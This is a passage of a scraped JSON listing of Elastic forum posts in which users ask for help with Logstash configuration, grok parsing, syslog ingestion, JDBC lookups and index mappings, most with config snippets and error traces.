    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 20, 2020, 2:47pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c2354007-69d4-40ed-bfef-5e706c6c9cfa",
    "url": "https://discuss.elastic.co/t/es7-6-2-logstash7-6-2-why-logstash-maps-to-the-default-index-template-when-the-index-name-not-match-the-index-patterns/228769",
    "title": "[es7.6.2][logstash7.6.2]Why logstash maps to the default index template when the index name not match the index_patterns?",
    "category": [
      "Logstash"
    ],
    "author": "cheriemilk",
    "date": "April 20, 2020, 5:00am April 20, 2020, 2:42pm",
    "body": "Hi Team, When starting logstash, I see below log which means that my data will be indexed according to default template structure. [2020-04-16T13:05:48,661][INFO ] [logstash.outputs.elasticsearch][main] Using default mapping template [2020-04-16T13:05:48,718][INFO ][logstash.outputs.elasticsearch][main] Attempting to install template {:manage_template=>{\"index_patterns\"=>\"logstash-*\", \"version\"=>60001, \"settings\"=>{\"index.refresh_interval\"=>\"5s\", \"number_of_shards\"=>1}, \"mappings\"=>{\"dynamic_templates\"=>[{\"message_field\"=>{\"path_match\"=>\"message\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false}}}, {\"string_fields\"=>{\"match\"=>\"*\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false, \"fields\"=>{\"keyword\"=>{\"type\"=>\"keyword\", \"ignore_above\"=>256}}}}}], \"properties\"=>{\"@timestamp\"=>{\"type\"=>\"date\"}, \"@version\"=>{\"type\"=>\"keyword\"}, \"geoip\"=>{\"dynamic\"=>true, \"properties\"=>{\"ip\"=>{\"type\"=>\"ip\"}, \"location\"=>{\"type\"=>\"geo_point\"}, \"latitude\"=>{\"type\"=>\"half_float\"}, \"longitude\"=>{\"type\"=>\"half_float\"}}}}}}} What confuse me is that the conditions to match the default template is that index name must start with \"logstash-\", but the index name I defined in logstash.conf is \"uba\", which means that it's impossible match to the default template. Anyone know what's the reason output { elasticsearch { action => \"index\" hosts => [\"http://localhost:9200\"] index => \"uba\" } stdout { codec => rubydebug {metadata => true}} }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "1b90c105-c250-40d1-b502-ee10a1931462",
    "url": "https://discuss.elastic.co/t/struck-grok-for-linux-application-log/228884",
    "title": "Struck Grok for Linux Application Log",
    "category": [
      "Logstash"
    ],
    "author": "BALA_BALA",
    "date": "April 20, 2020, 2:24pm",
    "body": "Hi Friends, I am writing grok for Linux application logs and able to achieve half. Need your suggestions on how to get the remaining data(optional data). Or do we have any other way to get these data? Application log Example: ABC-LNV 7099177 1 0 MOVING In 2020-01-16T14:30:35Z Error Process Out, Advice Qty. 1.000000, 1.000000 Shortage (manual) Order 911179536/1/1/0 Error 099-012383820-MOVING-E117199211.xml Inv. Mov Nr LNV-11GT014 0 1000002IPCC 14230106 0342 username MA3G Upto below lines am able to define grok.. after the ERROR fields , rest of the fields data's are optional ..it may or may not have data (null or empty field) ABC-LNV 7099177 1 0 MOVING In 2020-01-16T14:30:35Z Error Process Out, Advice Qty. 1.000000, 1.000000 Shortage (manual) Order 911179536/1/1/0 Error GROk command : (?[a-zA-Z0-9._-]+)\\s+(?[\\d]+)\\s+(?[\\d]+)\\s+(?[\\d]+)\\s+(?[\\w-#]+)\\s+(?[\\w]+)\\s+%{TIMESTAMP_ISO8601:Processing_Time}\\s+(?(.+)\\s+).+?(?=Error\\s\\s)(?[\\w]+)\\s+ Rest of below data are optional which may or may not have data..with tab delimited 099-012383820-MOVING-E117199211.xml Inv. Mov Nr LNV-11GT014 0 1000002IPCC 14230106 0342 username MA3G",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d31b2be5-53e9-4df4-8ae7-548ddf075922",
    "url": "https://discuss.elastic.co/t/logstash-taking-too-long-to-run/228536",
    "title": "Logstash taking too long to run",
    "category": [
      "Logstash"
    ],
    "author": "Robert_Ga",
    "date": "April 17, 2020, 2:17pm April 17, 2020, 3:36pm April 17, 2020, 4:05pm April 17, 2020, 5:03pm April 17, 2020, 5:49pm April 17, 2020, 6:36pm April 18, 2020, 12:33pm April 20, 2020, 1:24pm",
    "body": "Hello everyone, I started to index aprox. 1.000.000 json files into elastic seach using logstash. The logstash config contains some lowercase, renaming operations and if-else statements. I`m trying to index the data using 16 threads and batch size = 256. The problem is that if I look in Kibana, at Index Management, I can`t see the index created yet and the logstas is running since 3 hours ago From what I know, logstash should start the documents indexing after finnishing each batch. Is my understanding wrong? Also, I tried with about 30k documents and everything was fine. I want to know if something is wrong with my conf file/elastic search instance or it`s just normal to take that much. Thank you!",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "196099fc-fe1c-44b1-9c8f-2ce1078462f2",
    "url": "https://discuss.elastic.co/t/split-nested-json-array-from-log/228668",
    "title": "Split nested json array from log",
    "category": [
      "Logstash"
    ],
    "author": "rajender",
    "date": "April 18, 2020, 6:21pm April 18, 2020, 6:34pm April 18, 2020, 6:53pm April 18, 2020, 6:56pm April 18, 2020, 8:49pm April 18, 2020, 10:53pm April 19, 2020, 12:54am April 19, 2020, 9:07am April 19, 2020, 9:09am April 19, 2020, 3:02pm April 19, 2020, 5:36pm April 19, 2020, 7:49pm April 20, 2020, 12:43pm",
    "body": "I would like to to retrieve every element in below JSON to be a field so as to visualize in kibana by applying metrics in dashboard. log1318×57 3.16 KB I need each object in the array msg to be a separate entry in Elasticsearch and every attribute like eid etc to be a field. How would I create filter in configuring Logstash to do this? I would like to have output to elasticsearch { \"name\":\"server-app\", \"hostname\":\"hostname11\", ........... ........... \"msg.eid\":\"PRINT\", \"msg.ver\":\"10.0\", ........ ....... }",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "89b3ac18-7a95-4a4f-b88b-266a9d3c8883",
    "url": "https://discuss.elastic.co/t/confusion-with-making-logstash-ha/228855",
    "title": "Confusion with making Logstash HA",
    "category": [
      "Logstash"
    ],
    "author": "Egert143",
    "date": "April 20, 2020, 11:53am",
    "body": "Hello First time Elk Stack user. I could use some help with understanding Logstash HA. Currently i have started up 3 nodes (old HW, but they will do for testing). Lets call them Node-A,B,C. Each node is in different physical location. Elasticsearch + Kibana was quite easy to install. Confusion starts with logstash, i would like to have it in HA too, so if node A is offline, Node B will still recive logs and visa versa. All tutorials that i have read, use ssl certificate in input phase, thats fine when for example filebeat connects to Logstash-A, but how can it connect to Logstash-B (in event of node a failure) that has different certficate ? Does that also mean, each client will need two filebeats? What about firewall syslogs ? Roles: Node-A [Master,Data,Ingest] + Kibana Node-B [Master,Data,Ingest] + Kibana Node-C [Master, Voting only]",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f18e4622-3548-4f0c-a3fd-b1b4a2f6a139",
    "url": "https://discuss.elastic.co/t/syslog-with-line-codec-delimiter-change-fail-the-grok-parser/228829",
    "title": "Syslog with line Codec delimiter change fail the grok parser",
    "category": [
      "Logstash"
    ],
    "author": "realgam3",
    "date": "April 20, 2020, 9:43am",
    "body": "H all, when using this configuration: input { syslog { port => 1337 host => \"0.0.0.0\" codec => line { delimiter => \"\\n\" } } } with kv filter it fails with the tag \"_grokparsefailure_sysloginput\" although the default delimiter is \"\\n\", I am trying to change the delimiter to \"\\r\\n\" but I can't even work with \"\\n\" as a delimiter, it looks like it is trying to split lines by \"\\n\" and also \"\\n\", but when staying on default it is not spliting lines as \"\\n\". Error: { \"facility\" => 0, \"facility_label\" => \"kernel\", \"@timestamp\" => 2020-04-20T09:19:49.637Z, \"severity\" => 0, \"severity_label\" => \"Emergency\", \"priority\" => 0, \"message\" => \"Accept-Encoding: gzip, deflate\", \"tags\" => [ [0] \"_grokparsefailure_sysloginput\" ], \"host\" => \"1.3.3.7\", \"@version\" => \"1\" } Is there any other way to trim \\r from the message (it causing me use a workaround on the kv filter) ? Thanks.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ef4e677d-1ba1-418e-9a98-15a212d5b062",
    "url": "https://discuss.elastic.co/t/database-stable-connection/228808",
    "title": "Database stable connection",
    "category": [
      "Logstash"
    ],
    "author": "jagan",
    "date": "April 20, 2020, 8:24am",
    "body": "Hi guru's, when a kafka job is run i got the following erro: [ERROR][logstash.pipeline ] er.PhysicalConnection.close(oracle/jdbc/driver/PhysicalConnection.java:2502)\", \"java.lang.reflect.Method.invoke(java/lang/reflect/Method.java:498)\", \"org.jruby.javasupport.JavaMethod.invokeDirectWithExceptionHandling(org/jruby/javasupport/JavaMethod.java:423)\", \"org.jruby.javasupport.JavaMethod.invokeDirect(org/jruby/javasupport/JavaMethod.java:290)\", \"apps.ccadmin.logstash6_dot_2.vendor.bundle.jruby.$2_dot_3_dot_0.gems.sequel_minus_5_dot_7_dot_1.lib.sequel.adapters.jdbc.disconnect_connection(/apps/ccadmin/logstash6.2/vendor/bundle/jruby/2.3.0/gems/sequel-5.7.1/lib/sequel/adapters/jdbc.rb:220)\", \"apps.ccadmin.logstash6_dot_2.vendor.bundle.jruby.$2_dot_3_dot_0.gems.sequel_minus_5_dot_7_dot_1.lib.sequel.adapters.jdbc.RUBY$method$disconnect_connection$0$VARARGS(apps/ccadmin/logstash6_dot_2/vendor/bundle/jruby/$2_dot_3_dot_0/gems/sequel_minus_5_dot_7_dot_1/lib/sequel/adapters//apps/ccadmin/logstash6.2/vendor/bundle/jruby/2.3.0/gems/sequel-5.7.1/lib/sequel/adapters/jdbc.rb)\", \"apps.ccadmin.logstash_minus_6_dot_2_dot_4.vendor.bundle.jruby.$2_dot_3_dot_0.gems.sequel_minus_5_dot_7_dot_1.lib.sequel.connection_pool.disconnect_connection....... so here there is no specific time in connection failure.Once the connection fails all the waiting events will remain pending. The failure is happening at any time it can't be predicted (i.e like no peak time etc..) How should i handle for stable connection.Since there are many users existed so no database sided is handled. i need to handle in logstash script only. Here the oracle db is the source and ES is the target all the events comes via logstash. Please help me . Thanks in advance Jagan",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "17168c26-8dbc-4dc4-aa65-788d5edcba83",
    "url": "https://discuss.elastic.co/t/can-someone-please-help-aggregation-error-how-to-use-existing-index-and-add-additional-info/228748",
    "title": "Can someone please help? Aggregation error. How to use existing index and add additional info?",
    "category": [
      "Logstash"
    ],
    "author": "Dinesh_Gupta",
    "date": "April 19, 2020, 5:12pm April 19, 2020, 5:15pm April 19, 2020, 5:19pm April 19, 2020, 5:36pm April 19, 2020, 6:32pm April 19, 2020, 7:50pm April 19, 2020, 9:05pm April 19, 2020, 11:55pm April 20, 2020, 8:09am",
    "body": "I have an index created say, student_master. I now have a CSV from which I need to map with the ID of the index present and combine them and populate it in a new index. Both have the same ID. I tried using aggregation but did not work. Can someone please help? Been in on for days. I tried the below code: input { elasticsearch { hosts => \"localhost\" index => \"student-master\" docinfo => true tags => [\"in1\"] } file { path => \"/Users/dineshgupta/Downloads/student_marks_new.csv\" start_position => \"beginning\" sincedb_path => \"/dev/null\" tags => [\"in2\"] } } filter { aggregate { task_id => \"%{ID}\" code => \" if (event.get('tags').include('in1')) map['Gender'] = event.get('Gender'); map['State'] = event.get('State'); else map['Chemistry'] = event.get('Chemistry'); map['Physics'] = event.get('Physics'); end event.cancel(); \" #inactivity_timeout => 300 #seconds since last event #push_map_as_event_on_timeout => true #timeout_task_id_field => \"ID\" } } output { elasticsearch { #action => update doc_as_upsert => true document_type => \"doc\" document_id => \"%{ID}\" index => \"students-new-%{+YYYY.MM.dd}\" } stdout { codec => rubydebug } } My output is not what I expected. Can someone please tell me what mistake am I making here?",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "1771f5a9-d828-4134-9c8c-6a60f1217254",
    "url": "https://discuss.elastic.co/t/how-to-gather-logs-from-a-router/228660",
    "title": "How to gather logs from a router",
    "category": [
      "Logstash"
    ],
    "author": "Hari_Krishna",
    "date": "April 18, 2020, 4:50pm April 19, 2020, 11:24pm April 20, 2020, 4:31am April 20, 2020, 5:46am April 20, 2020, 6:20am April 20, 2020, 6:45am April 20, 2020, 6:53am April 20, 2020, 6:57am April 20, 2020, 7:06am April 20, 2020, 7:08am April 20, 2020, 7:45am April 20, 2020, 7:45am April 20, 2020, 7:45am",
    "body": "I have a Juniper router from which i have to send logs to logstash. What should i do in this case",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "ce2a138a-c34f-45ed-ac67-d9baab88b3f0",
    "url": "https://discuss.elastic.co/t/how-to-forward-logs-to-newrelic-dashboard-from-logstash/228798",
    "title": "How to forward logs to newrelic dashboard from logstash",
    "category": [
      "Logstash"
    ],
    "author": "ppantang",
    "date": "April 20, 2020, 7:25am",
    "body": "anyone help me to to configure the logstash to forward the logs to newrelic dashboard.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6042431b-6907-4bea-8b5b-9e91c380e7d9",
    "url": "https://discuss.elastic.co/t/error-in-gathering-syslogs-from-router/228781",
    "title": "Error in gathering syslogs from router",
    "category": [
      "Logstash"
    ],
    "author": "Hari_Krishna",
    "date": "April 20, 2020, 4:45am April 20, 2020, 5:56am April 20, 2020, 6:21am",
    "body": "input { syslog { host => \"10.216.123.213\" type => \"syslog\" } } exception=>#<Errno::EADDRNOTAVAIL: Cannot assign requested address - bind - Cannot assign requested address>, :backtrace=>[\"org/jruby/2.5.0/gems/logstash-input-syslog-3.4.1/lib/logstash/inputs/syslog.rb:149:in udp_listener'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-syslog-3.4.1/lib/logstash/inputs/syslog.rb:130:in server'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-syslog-3.4.1/lib/logstash/inputs/syslog.rb:110:in `block in run' exception=>#<Errno::EACCES: Permission denied",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "51b5550d-7658-431a-9295-c11e0adcb820",
    "url": "https://discuss.elastic.co/t/mapping-multiple-values-in-single-csv-row-output/227653",
    "title": "Mapping multiple values in single CSV row output",
    "category": [
      "Logstash"
    ],
    "author": "karnamonkster",
    "date": "April 12, 2020, 8:50am April 12, 2020, 2:02pm April 12, 2020, 2:34pm April 12, 2020, 3:36pm April 13, 2020, 4:57am April 13, 2020, 6:48am April 15, 2020, 5:14am April 14, 2020, 3:34am April 14, 2020, 12:57pm April 20, 2020, 6:21am",
    "body": "We have an ES index that has different register for Meters Example: Event1 meter: FT1234 register:FLOW RATE value: somevalue1 Event2 meter:FT1234 register:REV RATE value: somevalue2 Event3 meter:FT1234 register:VOLUME value: somevalue3 Now i needs all these register into a single CSV output file which would be like Headers: Meter, FLOWRATE,REVRATE,VOLUME VALUES: FT1234,somevalue1,somevalue2,somevalue3",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "ac43e7bc-4b20-46e9-bf1d-55aa3964db08",
    "url": "https://discuss.elastic.co/t/design-options-for-ingesting-syslog-data/228619",
    "title": "Design options for ingesting syslog data",
    "category": [
      "Logstash"
    ],
    "author": "sera",
    "date": "April 18, 2020, 6:02am April 18, 2020, 10:14am April 19, 2020, 5:50am April 20, 2020, 3:05am April 20, 2020, 6:16am",
    "body": "Greetings! Fairly new to Elastic Stack, so am looking for some high level design advice. Regarding syslog input, my requirement is for network devices (Cisco, Juniper, Pulse Secure, etc) to syslog to Logstash, with a filtered set of these logs then output to ES. From reading around it seem there are 3 basic options: Use Logstash syslog input plugin with additional grok patterns for non-RFC3164 formats. Use Logstash UDP input plugin with additional grok patterns for non-RFC3164 formats. Build Rsyslog server (on Logstash server), with a rsyslog JSON template for formatting the syslog data. Configure network devices to send logs to Rsyslog server on UDP514. Configure Rsyslog to forward to Logstash (on a non-standard UDP port), and configure Logstash to receive JSON codec from Rsyslog. Are these all sensible options? If so, is option 3 more likely to have performance concerns? For options 1 and 2, how difficult and reliable are the creation of the grok patterns? Any general thoughts and advice much appreciated. Many thanks, Sera",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b38a611e-d8c3-4a59-9d10-3408773c71c2",
    "url": "https://discuss.elastic.co/t/batch-http-lookup-filter/228789",
    "title": "Batch http lookup filter",
    "category": [
      "Logstash"
    ],
    "author": "AmirBahrami",
    "date": "April 20, 2020, 5:23am",
    "body": "Hey everybody I'm looking for a way to do batch lookups by http filter on some event field an then merge those parts together. I thought it'd be possible with something temporary like '@metadata' field but as I found metadata is dedicated per event. Would anyone help me on this?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7dfad28e-c03e-4942-a1ba-916390c7a419",
    "url": "https://discuss.elastic.co/t/loop-through-fields-to-find-a-matching-value/227601",
    "title": "Loop through fields to find a matching value",
    "category": [
      "Logstash"
    ],
    "author": "krille.com",
    "date": "April 11, 2020, 12:12pm April 11, 2020, 3:48pm April 12, 2020, 4:59am April 12, 2020, 2:01pm",
    "body": "I have 2 fields (integer) called Year and Month e.g. Year = 2016 Month = 9 I have from an array created seqRate.## fields e.g. \"rateSeq\": { \"0\": \"﻿2016;8;0.0001285760\", \"1\": \"2016;9;0.0001287969\", \"2\": \"2016;10;0.0001302932\", I would like to match through the fields (number of fields created is dynamic) and add a field of the third value, to later be used as input for calculating a number... How can I get the third value when first value and second value matches Year and Month???",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "bb7e8774-08c3-4a4b-ab08-249c44bd41be",
    "url": "https://discuss.elastic.co/t/how-can-i-remove-dot-from-nested-object-in-logstash/228159",
    "title": "How can I remove dot from nested object in logstash",
    "category": [
      "Logstash"
    ],
    "author": "esfandani",
    "date": "April 15, 2020, 3:48pm April 15, 2020, 5:42pm April 20, 2020, 3:50am",
    "body": "what goes to elasticsearch is something like this: { \"result\": \"https://www.yahoo.com\", \"tags\": { \"url\": \"https://www.yahoo.com\", \"projectName\": \"monitor\", \"host\": \"ttt\", \"dd\": 12345, \"vv\": \"kk\" }, \"timestamp\": 1586599441000, \"runId\": 12345, \"performance\": { \"x.y.z\": 31307 }, \"channel\": \"clientperf\", \"asset\": { \"a.b.c\": 5, \"a.b\":4 } } as you see values inside asset and performance has dot and we don't have access to the original source to change. Also as you can see we can have both values a.b.c and a.b which makes problem in mapping. How can I resolve this either with replacing the dot in logstash or anything that doesn't give me error Object mapping for [x] tried to parse field [x.y] as object, but found a concrete value",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c626f1cd-40e3-4633-a992-5e06d6ae74ef",
    "url": "https://discuss.elastic.co/t/logstash-filter-combine/228764",
    "title": "Logstash filter combine",
    "category": [
      "Logstash"
    ],
    "author": "VamPikmin",
    "date": "April 19, 2020, 10:22pm April 20, 2020, 12:54am April 20, 2020, 12:53am",
    "body": "Is it possible to use match and mutate in the same filter? Message is in the following format: <164>%ASA-4-722051: Group <DfltGrpPolicy> User <test_user> IP <test_ip> IPv4 Address <test_ip> IPv6 address <::> assigned to session filter { if [type] == \"cisco-asa\" and \"ASA-4-722051\" in [message] { grok { match => { \"message\" => \"<164>%ASA-4-722051: Group <%{USERNAME:Group}> User <%{NOTSPACE:Username}> IP <%{IP:client_ip}> IPv4 Address <%{IP:client_vpn}> IPv6 address <%{IP:client_vpn_IPv6}> assigned to session\" }}}} filter { if [type] == \"cisco-asa\" and \"ASA-4-722051\" in [message] { mutate { remove_field => [\"client_vpn_IPv6\"] } }} Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b53e8556-9cd2-49df-8bbd-0f1d6bae97b2",
    "url": "https://discuss.elastic.co/t/logstash-error-with-configuration/228756",
    "title": "Logstash Error with configuration",
    "category": [
      "Logstash"
    ],
    "author": "tom_marshall",
    "date": "April 19, 2020, 7:08pm April 19, 2020, 9:57pm April 19, 2020, 9:59pm",
    "body": "Hi, Can anyone please help with this issue, I am running logstack. I made lesson on Udemy course (https://www.udemy.com/course/elasticsearch-7-and-elastic-stack/learn/lecture/14729000#announcements) data: wget http://media.sundog-soft.com/es/access_log there is my logstash.conf file: input { file { path => \"/home/student/access_log“ start_position => \"beginning\" } } filter { grok { match => { \"message\" => \"%{COMBINEDAPACHELOG}\" } } date { match => [ \"timestamp\", \"dd/MMM/yyyy:HH:mm:ss Z\" ] } } output { elasticsearch { hosts => [\"localhost:9200\"] } stdout { codec => rubydebug } } And below is error respont sudo bin/logstash -f /etc/logstash/conf.d/logstash.conf [ERROR] 2020-04-19 18:59:12.963 [Converge PipelineAction::Create<main>] agent - Failed to execute action {:action=>LogStash::PipelineAction::Create/pipeline_id:main, :exception=>\"LogStash::ConfigurationError\", :message=>\"Expected one of [ \\\\t\\\\r\\\\n], \\\"#\\\", \\\"{\\\", \\\"}\\\" at line 4, column 21 (byte 73) after input {\\n\\tfile {\\n\\tpath => \\\"/home/student/access_log“\\n\\tstart_position => \\\"\", :backtrace=>[\"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:41:in `compile_imperative'\", \"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:49:in `compile_graph'\", \"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:11:in `block in compile_sources'\", \"org/jruby/RubyArray.java:2580:in `map'\", \"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:10:in `compile_sources'\", \"org/logstash/execution/AbstractPipelineExt.java:161:in `initialize'\", \"org/logstash/execution/JavaBasePipelineExt.java:47:in `initialize'\", \"/usr/share/logstash/logstash-core/lib/logstash/java_pipeline.rb:27:in `initialize'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline_action/create.rb:36:in `execute'\", \"/usr/share/logstash/logstash-core/lib/logstash/agent.rb:326:in `block in converge_state'\"]}",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b962ace0-e99c-40a8-bc4a-b0432bfd106a",
    "url": "https://discuss.elastic.co/t/can-someone-pls-help-me-with-my-logstash-parsers/228705",
    "title": "Can someone pls help me with my logstash parsers",
    "category": [
      "Logstash"
    ],
    "author": "Blason",
    "date": "April 19, 2020, 7:26am April 19, 2020, 3:06pm April 19, 2020, 6:03pm April 19, 2020, 7:49pm",
    "body": "Hi Guys, Somehow my grok pattern is not working and can someone please help? Here is original message 2020-04-18 13:02:20,391 INFO [ImapSSLServer-345] [ip=171.51.237.87;ua=com.samsung.android.email.provider;] security - cmd=Auth; account=aaaaa@bbbbb.com; protocol=imap; And here are my parsers %{TIMESTAMP_ISO8601:timestamp} %{WORD:level}%{SPACE:space}\\[%{WORD:gibber}\\]\\[%{WORD:ip}\\=%{IP:src_ip}\\;%{WORD:UserAgent}\\=%{DATA:data}\\;\\] %{WORD:method} \\- cmd=Auth\\; %{WORD:account}\\=%{GREEDYDATA:emailAddress}\\; %{DATA=protocol}\\=%{WORD:proto}\\;\"",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "71fee2f3-8a82-4fea-aa05-d7259649a4d5",
    "url": "https://discuss.elastic.co/t/jdbc-static-filter-is-not-mapping-the-data-from-postgresql/228710",
    "title": "JDBC_Static filter is not mapping the data from postgresql",
    "category": [
      "Logstash"
    ],
    "author": "anjilinga",
    "date": "April 19, 2020, 11:33am April 19, 2020, 3:00pm April 19, 2020, 7:29pm",
    "body": "I have loded lookup table in postgresql and used jdbc_static filter to enrich the data. while executing i am getting the below error. In staging directory the data is not loaded. Can some one please help what is the issue. Exception when executing Jdbc query {:lookup_id=>\"local-servers\", :exception=>\"Java::JavaSql::SQLSyntaxErrorException: Syntax error: Encountered \":\" at line 1, column 57.\", :backtrace=>[\"org.apache.derby.impl.jdbc.SQLExceptionFactory.getSQLException(org/apache/derby/impl/jdbc/SQLExceptionFactory)\", \"org.apache.derby.impl.jdbc.Util.generateCsSQLException(org/apache/derby/impl/jdbc/Util)\", \"org.apache.derby.impl.jdbc.TransactionResourceImpl.wrapInSQLException(org/apache/derby/impl/jdbc/TransactionResourceImpl)\", \"org.apache.derby.impl.jdbc.TransactionResourceImpl.handleException(org/apache/derby/impl/jdbc/TransactionResourceImpl)\", \"org.apache.derby.impl.jdbc.EmbedConnection.handleException(org/apache/derby/impl/jdbc/EmbedConnection)\", \"org.apache.derby.impl.jdbc.ConnectionChild.handleException(org/apache/derby/impl/jdbc/ConnectionChild)\", \"org.apache.derby.impl.jdbc.EmbedStatement.execute(org/apache/derby/impl/jdbc/EmbedStatement)\", \"org.apache.derby.impl.jdbc.EmbedStatement.executeQuery(org/apache/derby/impl/jdbc/EmbedStatement)\"]} Mu logstash config file is input { file { path => \"C:/Users/605824803/Documents/data/invcs.csv\" start_position => \"beginning\" sincedb_path => \"C:/Users/605824803/Documents/data/null26\" } } filter { csv{ separator => \",\" columns => [\"host_ip\",\"destin\"] skip_empty_columns => false } jdbc_static { loaders => [ { id => \"remote-users\" query => \"select host_ip, host_name from host_mapping\" local_table => \"users\" } ] local_db_objects => [ { name => \"users\" index_columns => [\"host_ip\"] columns => [ [\"host_ip\", \"varchar(50)\"], [\"host_name\", \"varchar(50)\"] ] } ] local_lookups => [ { id => \"local-servers\" query => \"SELECT host_name as HostName FROM users WHERE host_ip = :host_ip\" target => \"user\" } ] staging_directory => \"C:/Users/605824803/Documents/data/postgresdata\" jdbc_user => \"postgres\" jdbc_password => \"anji\" jdbc_driver_class => \"org.postgresql.Driver\" jdbc_driver_library => \"C:/Users/605824803/Downloads/postgresql-42.2.12.jar\" jdbc_connection_string => \"jdbc:postgresql://localhost:5432/Monitoring\" } } output { elasticsearch { hosts => \"http://localhost:9200\" manage_template => false index => \"test-host6\" } #stdout {codec => \"rubydebug\"} }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6acebc11-215a-4029-a0a3-1032ec3b96ea",
    "url": "https://discuss.elastic.co/t/cant-send-data-to-logstash-via-tcp-port-5959/228758",
    "title": "Can't send data to logstash via tcp port 5959",
    "category": [
      "Logstash"
    ],
    "author": "ilang",
    "date": "April 19, 2020, 7:17pm",
    "body": "Hi guys, I am trying to send to logstash using tcp port, It is working when the code is running on localhost, however, it should also run remotely. Maybe I need to use different plugin? (or just try to use rest api?) When I run: netstat -plnt I can see port 5959 is not available from outside the server: tcp6 0 0 :::5959 :::* LISTEN 6400/java logstash config file is: input { tcp { port => 5959 codec => json } } output { elasticsearch { hosts => [\"localhost:9200\"] index => \"tests\" user => \"elastic\" password => \"xxxxxx\" } stdout { codec => rubydebug } } your help is appreciated",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "bcfdad31-e024-4f1a-a7e3-c43a2295e778",
    "url": "https://discuss.elastic.co/t/saving-logfiles-in-another-server/228726",
    "title": "Saving logfiles in another server",
    "category": [
      "Logstash"
    ],
    "author": "Luis_Alfredo_Gonzale",
    "date": "April 19, 2020, 12:12pm",
    "body": "Hello, I currently im saving my logsfiles to this location, but I need to save in another server I'd like to know what is rigth way to do this.. Im trying to save to this path but it's not working. file{ path => \"smb://winftp/ftp/ftpTest-%{+YYYY-MM-dd_hh:mm}.txt\" } Thank You",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b7f554ef-f870-4851-a83a-09ca62f81ab3",
    "url": "https://discuss.elastic.co/t/i-need-create-logfile-every-5-minutes/228724",
    "title": "I need create logfile every 5 minutes",
    "category": [
      "Logstash"
    ],
    "author": "Luis_Alfredo_Gonzale",
    "date": "April 19, 2020, 11:44am",
    "body": "Hello. I need to create a logfile every 5 minutes. My settings is generating a log file every minute but i don't know how to set every 5 minutes. It is: file{ path => \"/home/govindo/Escritorio/ftpTest-%{+YYYY-MM-dd_hh:mm}.txt\" # index => \"ftpTest-%{+YYYY-MM-dd_hh:mm}.txt\" } Thanks for your helping",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b3203f0d-dfea-49d8-9a6f-b73a81a53101",
    "url": "https://discuss.elastic.co/t/location-array-object-not-indexed-with-logstash/228717",
    "title": "Location array object not indexed with logstash",
    "category": [
      "Logstash"
    ],
    "author": "Jalil",
    "date": "April 19, 2020, 10:19am",
    "body": "Bonjour, j'ai une collection mongodb contenant des documents dont un des objets est un array de coordonnées. voici un extract de mon mapping template : { \"_doc\": { \"_meta\": {}, \"_source\": {}, \"properties\": { \"distance\": { \"type\": \"long\" }, \"departure_city\": { \"type\": \"text\", \"fields\": { \"keyword\": { \"ignore_above\": 256, \"type\": \"keyword\" } } }, \"arrival_in\": { \"ignore_malformed\": true, \"type\": \"geo_point\", \"ignore_z_value\": true }, ... Voici ma config logstash : # config pour intégrer des données mongodb dans ES input{ mongodb { uri => 'mongodb://localhost:27017/trips' placeholder_db_dir => 'C:\\datadb\\logstash-mongodb' placeholder_db_name => 'logstash_sqlite.db' collection => 'trip' batch_size => 5000 } } filter{ mutate { copy => { \"_id\" => \"[@metadata][_id]\"} remove_field => [\"_id\"] } } output{ elasticsearch { manage_template => \"false\" #document_type => \"stop\" #template_overwrite => \"true\" template_name=>\"trip-template\" hosts => [\"localhost:9200\"] index => \"trip-3-%{+YYYY.MM.dd}\" } stdout { codec => rubydebug } } Voici un exemple de document mongodb à indexer : { \"_id\" : ObjectId(\"5e89cca6bf8ce1de0e13fa19\"), \"departure_at\" : ISODate(\"2019-03-18T14:27:46.000Z\"), \"departure_place\" : null, \"departure_city\" : \"Tina\", \"distance\" : 119, \"duration\" : 13231, \"fuel_consumption\" : null, \"arrival_at\" : ISODate(\"2019-03-18T18:08:17.000Z\"), \"arrival_in\" : [ 10.1039266666667, 33.889845 ], \"arrival_place\" : null, \"arrival_city\" : \"Gabes Medina\" } Je veux que Elasticsearch reconnaisse l'array \"arrival_in\" en tant geo_point provenant d'un array (je sais que lon et lat sont inversés ici). Résultat obtenu dans l'index : Je ne retrouve pas \"arrival_in\" ni ses valeurs. Merci d'avance. Jalil",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "a24cf282-db6a-4f80-bbec-00fdcfc7c977",
